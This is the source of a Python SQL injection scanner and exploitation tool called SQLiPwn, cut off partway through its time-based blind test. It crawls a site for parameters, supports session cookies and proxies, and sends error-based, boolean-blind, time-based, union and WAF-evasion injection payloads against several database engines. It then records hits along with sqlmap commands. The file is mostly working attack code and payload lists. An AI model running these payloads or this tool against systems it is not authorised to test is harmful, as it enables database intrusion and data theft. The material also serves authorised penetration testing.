#!/usr/bin/env python3
"""
SQLiPwn v2.1
Professional SQL injection detection and exploitation tool
Features: Multi-threading, Authentication support, Professional reporting


Author: syfi
"""
import argparse
import hashlib
import os
import random
import re
import sys
import time
import warnings
from collections import deque
from dataclasses import dataclass
from datetime import datetime
from typing import Dict, List, Optional, Set, Union
from urllib.parse import parse_qs, urljoin, urlparse, quote
import threading

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import concurrent.futures

# Local
from report_generator import ReportGenerator


init(autoreset=True)
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

@dataclass
class VulnerableEndpoint:

    url: str
    parameter: str
    method: str
    injection_type: str
    payload: str
    response_time: float
    error_message: str
    sqlmap_command: str
    confidence: str
    timestamp: str
    authenticated: bool = False

class UserAgentManager:

    
    def __init__(self):
        self.user_agents = [

            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            

            'sqlmap/1.7.11 (http://sqlmap.org)',
            'Nmap Scripting Engine; https://nmap.org/book/nse.html',
            'OWASP ZAP 2.12.0',
            'Burp Suite Professional',
            

            'curl/8.4.0',
            'wget/1.21.3',
            'PostmanRuntime/7.36.0',
            'Python-requests/2.31.0',
            'Apache-HttpClient/4.5.14',
            'okhttp/4.12.0'
        ]
        self._lock = threading.Lock()
        self._last_used_index = 0
    
    def get_random_user_agent(self) -> str:

        with self._lock:
            return random.choice(self.user_agents)
    
    def get_rotating_user_agent(self) -> str:

        with self._lock:
            ua = self.user_agents[self._last_used_index]
            self._last_used_index = (self._last_used_index + 1) % len(self.user_agents)
            return ua
    
    def get_default_user_agent(self) -> str:

        return self.user_agents[0]

class PayloadEngine:

    
    def __init__(self, fast_mode: bool = False, thorough_mode: bool = False):
        self.fast_mode = fast_mode
        self.thorough_mode = thorough_mode
        

        self.error_payloads = [
            "'",  # basic
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",  
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",   
            "' AND 1=CAST(@@version AS int)--",  
            "' AND 1=CONVERT(int,@@version)--",  # SQL Server
            "' UNION SELECT version(),1,1--",    # PostgreSQL
            "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL--",  # Oracle
            "' WAITFOR DELAY '0:0:5'--",         # SQL Server time delay
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL time delay
            "'; SELECT PG_SLEEP(5)--",           # PostgreSQL time delay
            "' AND DBMS_LOCK.SLEEP(5) IS NOT NULL--"  # Oracle time delay
        ]
        
        # Boolean-based blind payloads (optimized true/false pairs)
        self.boolean_payloads = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("\" AND 1=1--", "\" AND 1=2--"),
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("\" AND \"a\"=\"a\"--", "\" AND \"a\"=\"b\"--"),
            ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", 
             "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
            ("' AND SUBSTRING(@@version,1,1)=SUBSTRING(@@version,1,1)--",
             "' AND SUBSTRING(@@version,1,1)=SUBSTRING('X',1,1)--"),
            ("' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>0--",
             "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))<0--")
        ]
        
        # Time-based blind payloads
        self.time_payloads = [
            "' AND IF(1=1,SLEEP(5),0)--",        # MySQL conditional delay
            "' AND SLEEP(5)--",                  # MySQL direct delay
            "'; WAITFOR DELAY '0:0:5'--",        # SQL Server
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL subquery
            "'; SELECT PG_SLEEP(5)--",           # PostgreSQL
            "' AND DBMS_LOCK.SLEEP(5) IS NOT NULL--",  # Oracle
            "' OR IF(1=1,SLEEP(5),0)--",         # MySQL OR condition
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='nonexistent' OR SLEEP(5))--"
        ]
        
        # Union-based payloads 
        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT version(),user(),database()--",
            "' UNION SELECT @@version,user(),database()--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' ORDER BY 100--" 
        ]
        
        # WAF evasion payloads (only if thorough mode)
        self.evasion_payloads = []
        if thorough_mode:
            self.evasion_payloads = [
                "' UnIoN/**/sElEcT NULL--",
                "'/**/UNION/**/SELECT/**/NULL--",
                "'/**_**/UNION/**_**/SELECT/**_**/NULL--",
                "'+UNION+SELECT+NULL--",
                "'%20UNION%20SELECT%20NULL--",
                "'%0aUNION%0aSELECT%0aNULL--",
                "'%09UNION%09SELECT%09NULL--",
                "'%0cUNION%0cSELECT%0cNULL--",
                "' /*!UNION*/ /*!SELECT*/ NULL--",
                "' UNION/*!50000SELECT*/NULL--",
                "'%2f%2a%2aUNION%2a%2fSELECT%2f%2a%2aNULL%2a%2f--"
            ]
        
        # Optimize payload sets based on mode
        if fast_mode:
            self.error_payloads = self.error_payloads[:10]
            self.boolean_payloads = self.boolean_payloads[:4]
            self.time_payloads = self.time_payloads[:4]
            self.union_payloads = self.union_payloads[:8]
        elif thorough_mode:
            self.error_payloads.extend(self.evasion_payloads)
        

        self.db_patterns = {
            'MySQL': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch_array\(\)',
                r'Warning: mysql_',
                r'MySQLSyntaxErrorException',
                r'com\.mysql\.jdbc',
                r'MySQL server version',
                r'Unknown column.*in.*clause',
                r'Duplicate entry.*for key',
                r'Table.*doesn\'t exist',
                r'Column count doesn\'t match value count'
            ],
            'PostgreSQL': [
                r'PostgreSQL.*ERROR',
                r'Warning: pg_',
                r'valid PostgreSQL result',
                r'invalid input syntax',
                r'relation.*does not exist',
                r'column.*does not exist',
                r'operator does not exist',
                r'syntax error at or near'
            ],
            'Oracle': [
                r'ORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver',
                r'Warning: oci_',
                r'ORA-00936: missing expression',
                r'ORA-00942: table or view does not exist',
                r'ORA-00904: invalid identifier'
            ],
            'SQL Server': [
                r'Microsoft SQL Native Client error',
                r'ODBC SQL Server Driver',
                r'SQLServer JDBC Driver',
                r'Incorrect syntax near',
                r'Invalid column name',
                r'Cannot convert.*to.*int',
                r'Conversion failed',
                r'Line \d+: Incorrect syntax'
            ],
            'SQLite': [
                r'SQLite.*error',
                r'sqlite3\.OperationalError',
                r'no such table',
                r'SQL logic error',
                r'near.*syntax error',
                r'unrecognized token'
            ]
        }

class AuthenticationManager:

    
    def __init__(self, session: requests.Session):
        self.session = session
        self.is_authenticated = False
        self.auth_confidence = 0
        

        self.auth_indicators = [
            # indicators
            'logout', 'sign out', 'dashboard', 'profile', 'account', 'welcome',
            'admin', 'user panel', 'settings', 'signed in', 'logged in', 'my account',

            'welcome back', 'hello', 'member', 'authenticated'
        ]
        
        self.unauth_indicators = [

            'login', 'signin', 'sign in', 'authenticate', 'unauthorized', 'access denied',
            'please log in', 'session expired', 'authentication required', 'forbidden',

            'please sign in', 'login required', 'not authorized'
        ]
    
    def setup_cookies(self, cookies: Union[str, None]) -> bool:

        if not cookies:
            return False
        
        try:
            if os.path.exists(cookies):
                return self._load_cookies_from_file(cookies)
            else:
                return self._parse_cookie_string(cookies)
        except Exception as e:
            print(f"{Fore.RED}[!] Error setting up cookies: {str(e)}")
            return False
    
    def _load_cookies_from_file(self, cookie_file: str) -> bool:

        try:
            import json
            with open(cookie_file, 'r', encoding='utf-8') as f:
                content = f.read().strip()
            
            cookies_loaded = 0
            

            if content.startswith('[') or content.startswith('{'):
                try:
                    cookie_data = json.loads(content)
                    

                    if isinstance(cookie_data, list):
                        for cookie in cookie_data:
                            if isinstance(cookie, dict):
                                name = cookie.get('name', '')
                                value = cookie.get('value', '')
                                domain = cookie.get('domain', '')
                                path = cookie.get('path', '/')
                                
                                if name and value:
                                    self.session.cookies.set(name, value, domain=domain, path=path)
                                    cookies_loaded += 1
                    
                    # Simple JSON format {"name": "value"}
                    elif isinstance(cookie_data, dict):
                        for name, value in cookie_data.items():
                            self.session.cookies.set(name, str(value))
                            cookies_loaded += 1
                    
                    if cookies_loaded > 0:
                        print(f"{Fore.GREEN}[+] Loaded {cookies_loaded} cookies from JSON file")
                        return True
                        
                except json.JSONDecodeError:
                    pass
            

            for line in content.split('\n'):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                

                if '\t' in line and len(line.split('\t')) >= 7:
                    parts = line.split('\t')
                    name, value = parts[5], parts[6]
                    domain = parts[0]
                    path = parts[2]
                    
                    if name and value:
                        self.session.cookies.set(name, value, domain=domain, path=path)
                        cookies_loaded += 1
                
                # Simple format: name=value
                elif '=' in line:
                    name, value = line.split('=', 1)
                    self.session.cookies.set(name.strip(), value.strip())
                    cookies_loaded += 1
            
            if cookies_loaded > 0:
                print(f"{Fore.GREEN}[+] Loaded {cookies_loaded} cookies from file")
                return True
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading cookie file: {str(e)}")
        
        return False
    
    def _parse_cookie_string(self, cookie_string: str) -> bool:

        try:
            cookies_loaded = 0
            

            for separator in [';', '\n', ',']:
                if separator in cookie_string:
                    cookie_pairs = cookie_string.split(separator)
                    break
            else:
                cookie_pairs = [cookie_string]
            
            for cookie_pair in cookie_pairs:
                cookie_pair = cookie_pair.strip()
                if '=' in cookie_pair:
                    # Handle cases like "name=value; path=/; domain=.example.com"
                    main_part = cookie_pair.split(';')[0]
                    if '=' in main_part:
                        name, value = main_part.split('=', 1)
                        self.session.cookies.set(name.strip(), value.strip())
                        cookies_loaded += 1
            
            if cookies_loaded > 0:
                print(f"{Fore.GREEN}[+] Loaded {cookies_loaded} cookies from command line")
                return True
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error parsing cookie string: {str(e)}")
        
        return False
    
    def test_authentication(self, test_url: str) -> bool:

        try:
            print(f"{Fore.CYAN}[*] Testing authentication against: {test_url}")
            response = self.session.get(test_url, timeout=10, verify=False)
            
            if response.status_code == 403:
                print(f"{Fore.YELLOW}[!] HTTP 403 - Access forbidden (may indicate auth working but insufficient privileges)")
                return False
            elif response.status_code not in [200, 302, 301]:
                print(f"{Fore.YELLOW}[!] Authentication test - HTTP {response.status_code}")
                return False
            
            response_text = response.text.lower()
            
            # confidence scores
            auth_score = sum(3 if indicator in ['logout', 'dashboard', 'profile'] else 1 
                           for indicator in self.auth_indicators if indicator in response_text)
            unauth_score = sum(3 if indicator in ['login', 'signin', 'unauthorized'] else 1 
                             for indicator in self.unauth_indicators if indicator in response_text)
            
            self.auth_confidence = max(0, min(100, (auth_score - unauth_score) * 10 + 50))
            
            if auth_score > unauth_score:
                print(f"{Fore.GREEN}[+] Authentication appears to be working (confidence: {self.auth_confidence}%)")
                self.is_authenticated = True
                return True
            else:
                print(f"{Fore.YELLOW}[!] Authentication may not be working (confidence: {self.auth_confidence}%)")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error testing authentication: {str(e)}")
            return False

class WebCrawler:

    
    def __init__(self, base_url: str, max_depth: int = 3, delay: float = 0.5, 
                 max_pages: int = 100, auth_manager: AuthenticationManager = None, 
                 headers: Dict[str, str] = None, user_agent_manager: UserAgentManager = None,
                 proxy: str = None):
        self.base_url = base_url
        self.max_depth = max_depth
        self.delay = delay
        self.max_pages = max_pages
        self.visited_urls: Set[str] = set()
        self.found_parameters: Dict[str, Dict[str, List[str]]] = {}
        self.session = requests.Session()
        self.auth_manager = auth_manager
        self.user_agent_manager = user_agent_manager
        self.url_queue = deque([(base_url, 0)])  # (url, depth)
        self._request_count = 0
        self._lock = threading.Lock()
        
        # Setup proxy if provided
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            self.session.verify = False
        
        # default headers
        default_headers = {
            'User-Agent': user_agent_manager.get_default_user_agent() if user_agent_manager else 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        if headers:
            default_headers.update(headers)
        
        self.session.headers.update(default_headers)
        
        # Copy cookies from auth manager if available
        if auth_manager and auth_manager.session.cookies:
            for cookie in auth_manager.session.cookies:
                self.session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
    
    def crawl(self) -> Dict[str, Dict[str, List[str]]]:

        print(f"{Fore.CYAN}[*] Starting enhanced web crawling...")
        print(f"{Fore.CYAN}[*] Target: {self.base_url}")
        print(f"{Fore.CYAN}[*] Max depth: {self.max_depth}, Max pages: {self.max_pages}")
        
        pages_crawled = 0
        start_time = time.time()
        
        while self.url_queue and pages_crawled < self.max_pages:
            current_url, depth = self.url_queue.popleft()
            
            if current_url in self.visited_urls or depth > self.max_depth:
                continue
            
            if not self._is_valid_crawl_url(current_url):
                continue
                
            self.visited_urls.add(current_url)
            pages_crawled += 1
            
            try:

                if self.user_agent_manager:
                    self.session.headers['User-Agent'] = self.user_agent_manager.get_rotating_user_agent()
                
                elapsed_time = time.time() - start_time
                rate = pages_crawled / elapsed_time if elapsed_time > 0 else 0
                print(f"{Fore.YELLOW}[*] Crawling [{pages_crawled}/{self.max_pages}] (depth: {depth}, {rate:.1f} pages/sec): {current_url[:100]}{'...' if len(current_url) > 100 else ''}")
                
                with self._lock:
                    self._request_count += 1
                
                response = self.session.get(current_url, timeout=10, verify=False)
                
                # Extract GET parameters from current URL
                self._extract_get_parameters(current_url)
                
                # Parse HTML for forms and additional links
                if 'text/html' in response.headers.get('content-type', '').lower():
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract form parameters
                    self._extract_form_parameters(soup, current_url)
                    

                    self._extract_ajax_endpoints(soup, current_url)
                    

                    self._extract_api_endpoints(soup, current_url)
                    
                    # Extract links for next depth level
                    if depth < self.max_depth:
                        self._extract_links(soup, current_url, depth)
                
                # Adaptive delay based on response time
                if response.elapsed.total_seconds() > 2:
                    time.sleep(self.delay * 2)  # Slower server, increase delay
                else:
                    time.sleep(self.delay)
                
            except requests.exceptions.Timeout:
                print(f"{Fore.YELLOW}[!] Timeout crawling {current_url}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error crawling {current_url}: {str(e)}")
        
        # Clean up and optimize parameters
        self._optimize_parameters()
        
        total_params = sum(len(p['GET']) + len(p['POST']) for p in self.found_parameters.values())
        print(f"{Fore.GREEN}[+] Crawling completed: {pages_crawled} pages, {len(self.found_parameters)} endpoints, {total_params} parameters")
        return self.found_parameters
    
    def _extract_get_parameters(self, url: str):

        try:
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = list(parse_qs(parsed_url.query).keys())
                if params:
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    if base_url not in self.found_parameters:
                        self.found_parameters[base_url] = {'GET': [], 'POST': []}
                    
                    for param in params:
                        if param and param not in self.found_parameters[base_url]['GET']:
                            self.found_parameters[base_url]['GET'].append(param)
        except Exception as e:
            pass  
    
    def _extract_form_parameters(self, soup: BeautifulSoup, current_url: str):

        try:
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                

                if action:
                    form_url = urljoin(current_url, action)
                else:
                    form_url = current_url
                
                # Extract input parameters
                inputs = form.find_all(['input', 'textarea', 'select'])
                params = []
                
                for input_elem in inputs:
                    name = input_elem.get('name')
                    input_type = input_elem.get('type', '').lower()
                    
                    # Skip certain input types but include more types that could be vulnerable
                    skip_types = ['submit', 'button', 'reset', 'file', 'image', 'hidden']
                    if name and input_type not in skip_types:
                        params.append(name)
                    
                    # check for hidden parameters
                    elif name and input_type == 'hidden' and not any(skip in name.lower() for skip in ['csrf', 'token', '_token']):
                        params.append(name)
                
                # Extract select options
                selects = form.find_all('select')
                for select in selects:
                    name = select.get('name')
                    if name:
                        params.append(name)
                
                if params:
                    if form_url not in self.found_parameters:
                        self.found_parameters[form_url] = {'GET': [], 'POST': []}
                    
                    for param in params:
                        if param not in self.found_parameters[form_url][method]:
                            self.found_parameters[form_url][method].append(param)
        except Exception as e:
            pass  
    
    def _extract_ajax_endpoints(self, soup: BeautifulSoup, current_url: str):

        try:
            scripts = soup.find_all('script')
            
            for script in scripts:
                if script.string:
                    # AJAX patterns
                    ajax_patterns = [
                        r'\.get\(["\']([^"\']+)["\']',
                        r'\.post\(["\']([^"\']+)["\']',
                        r'\.ajax\([^{]*["\']?url["\']?\s*:\s*["\']([^"\']+)["\']',
                        r'url:\s*["\']([^"\']+)["\']',
                        r'fetch\(["\']([^"\']+)["\']',
                        r'XMLHttpRequest.*open\(["\'](?:GET|POST)["\'],\s*["\']([^"\']+)["\']',
                        r'axios\.[get|post]+\(["\']([^"\']+)["\']',
                        r'jQuery\.get\(["\']([^"\']+)["\']',
                        r'jQuery\.post\(["\']([^"\']+)["\']',
                        r'\$\.get\(["\']([^"\']+)["\']',
                        r'\$\.post\(["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in ajax_patterns:
                        try:
                            matches = re.findall(pattern, script.string, re.IGNORECASE)
                            for match in matches:
                                if match and not match.startswith('javascript:'):
                                    if '?' in match:
                                        ajax_url = urljoin(current_url, match)
                                        self._extract_get_parameters(ajax_url)
                        except re.error:
                            continue
        except Exception as e:
            pass  # handle parsing errors
    
    def _extract_api_endpoints(self, soup: BeautifulSoup, current_url: str):

        try:
            # Look for data-* attributes that might contain API endpoints
            elements_with_data = soup.find_all(attrs=lambda x: x and any(k.startswith('data-') for k in x.keys()))
            
            for elem in elements_with_data:
                for attr_name, attr_value in elem.attrs.items():
                    if attr_name.startswith('data-') and isinstance(attr_value, str):

                        if ('api' in attr_name.lower() or 'url' in attr_name.lower()) and ('/' in attr_value or '?' in attr_value):
                            if '?' in attr_value:
                                api_url = urljoin(current_url, attr_value)
                                self._extract_get_parameters(api_url)
            

            scripts = soup.find_all('script', type='application/json')
            for script in scripts:
                if script.string:
                    try:
                        import json
                        config = json.loads(script.string)
                        self._extract_urls_from_json(config, current_url)
                    except:
                        pass
        except Exception as e:
            pass  # handle parsing errors
    
    def _extract_urls_from_json(self, data, base_url):

        try:
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, str) and ('/' in value or '?' in value):
                        if key.lower() in ['url', 'endpoint', 'api', 'href', 'src']:
                            if '?' in value:
                                full_url = urljoin(base_url, value)
                                self._extract_get_parameters(full_url)
                    elif isinstance(value, (dict, list)):
                        self._extract_urls_from_json(value, base_url)
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, (dict, list)):
                        self._extract_urls_from_json(item, base_url)
        except Exception:
            pass
    
    def _extract_links(self, soup: BeautifulSoup, current_url: str, depth: int):

        try:
            links = soup.find_all('a', href=True)
            

            priority_links = []
            regular_links = []
            
            for link in links:
                href = link['href']
                next_url = urljoin(current_url, href)
                
                if self._is_valid_crawl_url(next_url):

                    if ('?' in href or 
                        any(keyword in href.lower() for keyword in ['search', 'filter', 'sort', 'page', 'id=', 'cat=', 'user='])):
                        priority_links.append((next_url, depth + 1))
                    else:
                        regular_links.append((next_url, depth + 1))
            

            for link_data in priority_links + regular_links[:50]:  
                self.url_queue.append(link_data)
                
        except Exception as e:
            pass  # handle parsing errors
    
    def _is_valid_crawl_url(self, url: str) -> bool:

        try:
            parsed = urlparse(url)
            base_parsed = urlparse(self.base_url)
            
            # Only crawl same domain
            if parsed.netloc and parsed.netloc != base_parsed.netloc:
                return False
            
            # Skip certain file extensions and paths
            skip_extensions = [
                '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico',
                '.zip', '.rar', '.exe', '.mp4', '.mp3', '.doc', '.docx', '.xls', '.xlsx',
                '.xml', '.json', '.txt', '.csv', '.svg', '.woff', '.ttf', '.eot'
            ]
            
            skip_paths = [
                'logout', 'signout', 'exit', 'download', 'print', 'export',
                'mailto:', 'tel:', 'javascript:', 'data:', '#'
            ]
            
            path = parsed.path.lower()
            
            # Check file extensions
            if any(path.endswith(ext) for ext in skip_extensions):
                return False
                
            # Check skip paths
            if any(keyword in path or keyword in url.lower() for keyword in skip_paths):
                return False
            
            # Skip external links
            if parsed.scheme and parsed.scheme not in ['http', 'https']:
                return False
            
            # Skip very long URLs
            if len(url) > 500:
                return False
            
            return True
            
        except Exception:
            return False
    
    def _optimize_parameters(self):

        for url in list(self.found_parameters.keys()):
            for method in self.found_parameters[url]:

                filtered_params = []
                skip_params = [
                    'csrf_token', 'token', '_token', 'authenticity_token', 
                    '_csrf', 'csrfmiddlewaretoken', '_method', '__viewstate',
                    '__eventvalidation', '__requestverificationtoken'
                ]
                
                for param in set(self.found_parameters[url][method]):
                    if param and param.lower() not in [p.lower() for p in skip_params]:

                        if not any(skip_word in param.lower() for skip_word in ['captcha', 'recaptcha', 'antiforgery']):
                            filtered_params.append(param)
                
                self.found_parameters[url][method] = sorted(list(set(filtered_params)))
            

            if not self.found_parameters[url]['GET'] and not self.found_parameters[url]['POST']:
                del self.found_parameters[url]

class InjectionTester:

    
    def __init__(self, payload_engine: PayloadEngine, auth_manager: AuthenticationManager = None, 
                 timeout: int = 10, headers: Dict[str, str] = None, user_agent_manager: UserAgentManager = None,
                 proxy: str = None):
        self.payload_engine = payload_engine
        self.auth_manager = auth_manager
        self.timeout = timeout
        self.session = requests.Session()
        self.user_agent_manager = user_agent_manager
        self._baseline_cache = {}
        self._lock = threading.Lock()
        
        # Setup proxy if provided
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            self.session.verify = False
        
        # default headers
        default_headers = {
            'User-Agent': user_agent_manager.get_default_user_agent() if user_agent_manager else 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        if headers:
            default_headers.update(headers)
        
        self.session.headers.update(default_headers)
        
        # Copy cookies from auth manager
        if auth_manager and auth_manager.session.cookies:
            for cookie in auth_manager.session.cookies:
                self.session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
    
    def test_endpoint(self, url: str, params: Dict[str, List[str]]) -> List[VulnerableEndpoint]:

        vulnerabilities = []
        
        # Test GET parameters
        for param in params.get('GET', []):
            vuln = self._test_parameter(url, param, 'GET')
            if vuln:
                vulnerabilities.append(vuln)
                # If we find a high confidence vulnerability, we can optionally skip other parameters
                # for this endpoint to save time (uncomment if desired)
                # if vuln.confidence == "HIGH":
                #     break
        
        # Test POST parameters
        for param in params.get('POST', []):
            vuln = self._test_parameter(url, param, 'POST')
            if vuln:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_parameter(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:

        print(f"{Fore.CYAN}[*] Testing {method} parameter '{param}' on {url}")
        
        # Test in order of reliability and speed
        test_methods = [
            ('error', self._test_error_based, 'high'),     # Fast and reliable
            ('union', self._test_union_based, 'high'),     # Fast and reliable  
            ('boolean', self._test_boolean_blind, 'medium'), # Slower but reliable
            ('time', self._test_time_based, 'low')         # Slowest, last resort
        ]
        
        best_result = None
        
        for test_type, test_method, priority in test_methods:
            try:
                result = test_method(url, param, method)
                if result:
                    if result.confidence == "HIGH":
                        return result  # Return immediately on high confidence
                    elif not best_result or self._get_confidence_score(result.confidence) > self._get_confidence_score(best_result.confidence):
                        best_result = result
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error in {test_type} test for {param}: {str(e)}")
                continue
        
        return best_result
    
    def _test_error_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:

        for payload in self.payload_engine.error_payloads:
            try:
                start_time = time.time()
                response = self._make_request(url, param, payload, method)
                if not response:
                    continue
                    
                response_time = time.time() - start_time
                

                for db_type, patterns in self.payload_engine.db_patterns.items():
                    for pattern in patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            confidence = self._calculate_error_confidence(pattern, response.text)
                            
                            # Extract more detailed error information
                            error_context = self._extract_error_context(response.text, matches[0] if matches else pattern)
                            
                            return VulnerableEndpoint(
                                url=url,
                                parameter=param,
                                method=method,
                                injection_type=f"Error-based ({db_type})",
                                payload=payload,
                                response_time=response_time,
                                error_message=error_context,
                                sqlmap_command=self._generate_sqlmap_command(url, param, method),
                                confidence=confidence,
                                timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                authenticated=self.auth_manager.is_authenticated if self.auth_manager else False
                            )
                
            except Exception as e:
                continue
        
        return None
    
    def _test_boolean_blind(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:

        try:
            # Get or create baseline response
            baseline_key = f"{url}_{param}_{method}"
            if baseline_key not in self._baseline_cache:
                baseline_response = self._make_request(url, param, "1", method)
                if not baseline_response:
                    return None
                
                with self._lock:
                    self._baseline_cache[baseline_key] = {
                        'hash': hashlib.md5(baseline_response.text.encode()).hexdigest(),
                        'length': len(baseline_response.text),
                        'status': baseline_response.status_code
                    }
            
            baseline = self._baseline_cache[baseline_key]
            

            for true_payload, false_payload in self.payload_engine.boolean_payloads:
                try:
                    true_response = self._make_request(url, param, true_payload, method)
                    false_response = self._make_request(url, param, false_payload, method)
                    
                    if not (true_response and false_response):
                        continue
                    
                    true_hash = hashlib.md5(true_response.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_response.text.encode()).hexdigest()
                    
                    # response analysis
                    length_diff = abs(len(true_response.text) - len(false_response.text))
                    status_diff = true_response.status_code != false_response.status_code
                    hash_diff = true_hash != false_hash
                    

                    true_matches_baseline = (true_hash == baseline['hash'] or 
                                           abs(len(true_response.text) - baseline['length']) < 100)
                    
                    # Analyze response patterns
                    if hash_diff and length_diff > 20:
                        confidence = "HIGH" if (length_diff > 500 or status_diff or true_matches_baseline) else "MEDIUM"
                        
                        return VulnerableEndpoint(
                            url=url,
                            parameter=param,
                            method=method,
                            injection_type="Boolean-based Blind",
                            payload=true_payload,
                            response_time=0.0,
                            error_message=f"Response differences detected - Length: {length_diff} bytes, Status: {status_diff}, Hash differs: {hash_diff}",
                            sqlmap_command=self._generate_sqlmap_command(url, param, method),
                            confidence=confidence,
                            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            authenticated=self.auth_manager.is_authenticated if self.auth_manager else False
                        )
                
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return None
    
    def _test_time_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:

        try:

            baseline_key = f"{url}_{param}_{method}_time"
            
            if baseline_key not in self._baseline_cache:
                baseline_times = []
                for _ in range(3):  # Take 3 samples for better accuracy
                    try:
                        start_time = time.time()
                        response = self._make_request(url, param, "1", method)
                        if response:
                            baseline_times.append(time.time() - start_time)
                        time.sleep(0.1)  # Small delay between baseline requests
                    except Exception:
                        continue
                
                if not baseline_times:
                    return None
                

                if len(baseline_times) >= 3:
                    baseline_times.sort()
                    baseline_times = baseline_times[1:-1]  # Remove outliers
                
                with self._lock:
                    self._baseline_cache[baseline_key] = sum(baseline_times) / len(baseline_times)
            
            avg_baseline = self._baseline_cache[baseline_key]
            

            for payload in self.payload_engine.time_payloads:
                try:
                    start_time = time.time()
                    response = self._make_request(url, param, payload, method, timeout=15)  # Longer timeout for time-based
                    response_time = time.time() - start_time
                    
                    delay_diff = response_time - avg_baseline
                    
                    # time-based detection
                    if delay_diff > 3:  # 3+ second delay indicates likely injection
                        confidence = "HIGH" if delay_diff > 4.5 else "MEDIUM"
                        
                        return VulnerableEndpoint(
                            url=url,
                            parameter=param,
                            method=method,
                            injection_type="Time-based Blind",
                            payload=payload,
                            response_time=response_time,
